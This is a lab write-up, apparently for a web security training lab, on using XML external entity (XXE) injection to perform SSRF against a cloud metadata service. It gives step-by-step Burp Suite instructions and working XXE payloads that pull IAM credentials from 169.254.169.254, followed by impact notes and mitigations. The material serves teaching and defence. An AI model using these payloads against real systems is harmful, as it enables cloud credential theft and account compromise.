# 1. Exploiting XXE to Perform SSRF Attacks

## 2. CVSS Score

**CVSS v3.1 Base Score: 8.6 (High)**
**CWE-611: Improper Restriction of XML External Entity Reference (â€˜XXEâ€™)**

## 3. OWASP Top 10 Reference

* **A05:2021 â€“ Security Misconfiguration**
* **A10:2021 â€“ Server-Side Request Forgery (SSRF)**

## 4. Description of Vulnerability

This lab demonstrates a case where an **XML External Entity (XXE)** vulnerability is exploited to perform a **Server-Side Request Forgery (SSRF)** attack. By injecting a malicious `DOCTYPE` declaration into an XML request, the attacker forces the server to make internal HTTP requests to otherwise inaccessible endpoints.

The target in this lab is a **cloud instance metadata service** at `http://169.254.169.254/`, a common local endpoint used in cloud environments (e.g., AWS EC2) to provide instance configuration and credentials.

---

## 5. Detailed Explanation of What We Performed

We leveraged the XML parserâ€™s ability to resolve external entities to force the backend server to send HTTP requests to its own internal network interface (`169.254.169.254`). By navigating through the metadata serviceâ€™s path (`/latest/meta-data/...`), we eventually retrieved IAM role credentials, including a **SecretAccessKey**.

This is a realistic and high-severity SSRF attack that could lead to full compromise of cloud infrastructure.

---

## 6. Step-by-Step Procedure

ðŸ”¹ **Step 1: Visit the Target and Intercept the Request**

1. Navigate to any product page on the lab website.
2. Click the **"Check stock"** button.
3. Intercept the resulting **POST** request using **Burp Suite Proxy**.

ðŸ”¹ **Step 2: Inject Initial External Entity Targeting Metadata Endpoint Root**

4. Modify the request payload to inject a `DOCTYPE` that defines the `xxe` entity targeting the root of the metadata service:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

5. Forward the request and note the directory-style output in the response like:

   ```
   Invalid product ID: latest
   ```

ðŸ”¹ **Step 3: Explore the API by Updating the External Entity Path**

6. Update the entity URL to `http://169.254.169.254/latest/` and repeat the request.

7. Keep navigating deeper step-by-step:

   * `http://169.254.169.254/latest/meta-data/`
   * `http://169.254.169.254/latest/meta-data/iam/`
   * `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   * `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`

8. At the final URL, the response will contain JSON output similar to:

   ```json
   {
     "Code" : "Success",
     "LastUpdated" : "...",
     "Type" : "AWS-HMAC",
     "AccessKeyId" : "...",
     "SecretAccessKey" : "...",
     "Token" : "...",
     ...
   }
   ```

---

## 7. Impact of the Vulnerability

* **Cloud Credential Theft**: IAM credentials like `SecretAccessKey` can be used to access cloud APIs with high privileges.
* **Full Cloud Account Compromise**: If the exposed IAM role has administrative access, attackers could launch VMs, exfiltrate data, or destroy infrastructure.
* **Sensitive Internal Network Exposure**: The vulnerable application may be used as a proxy to scan internal services or exploit other systems.

---

## 8. Recommendations and Mitigations

* **Disable External Entity Resolution** in all XML parsers.
* **Use Whitelisted Network Requests Only**: Limit server access to internal resources via allowlists.
* **Implement SSRF Protections**: Use metadata service version 2 (IMDSv2) in cloud environments, which requires a session token to access.
* **Monitor and Log Internal HTTP Requests** for unusual behavior and use proper alerts for metadata access.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [AWS Metadata Service Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
* [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe/ssrf)

---

## 10. Proof of Concept

Final payload example targeting credential endpoint:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Expected Response Snippet:**

```
Invalid product ID: {
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  ...
}
